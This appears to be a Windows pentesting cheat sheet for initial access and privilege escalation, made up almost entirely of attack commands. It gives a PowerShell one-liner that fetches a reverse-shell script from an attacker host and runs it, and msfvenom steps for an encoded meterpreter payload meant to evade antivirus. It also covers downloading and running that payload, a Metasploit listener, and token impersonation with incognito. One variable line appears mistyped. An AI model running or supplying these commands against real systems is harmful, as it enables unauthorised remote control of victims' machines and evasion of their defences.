# Command for Initial Access and PrivEsc

* Get a reverseShell on the target system using *Invoke-PowerShellTcp.ps1* script from _nishang_:

```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://<your-ip>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <your-ip> -Port <your-port>
```

* Generate reverse_tcp payload with __msfvenom__:

```bash
export lhost=<your-ip>
export lhost=<your-port>
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$lhost LPORT=$lport -f exe -o shell.exe
```

	* This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

* After creating this payload, download it to the machine :

> Don't forget to run a local server using python3: `python3 -m http.server`

```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell.exe','shell.exe')"
```

* Before running the payload, we make sure that we set up a handler in metasploit:

```bash
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port
run
```

* start the reverse shell

```bash
Start-Process "shell.exe"
# Or
.\shell.exe
```

* View all the privileges using :

```bash
whoami /priv
```

* You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. 
* To load the incognito module in metasploit, Enter: 

```bash
load incognito 
```

* To check which tokens are available, Enter:

```bash
list_tokens -g
```

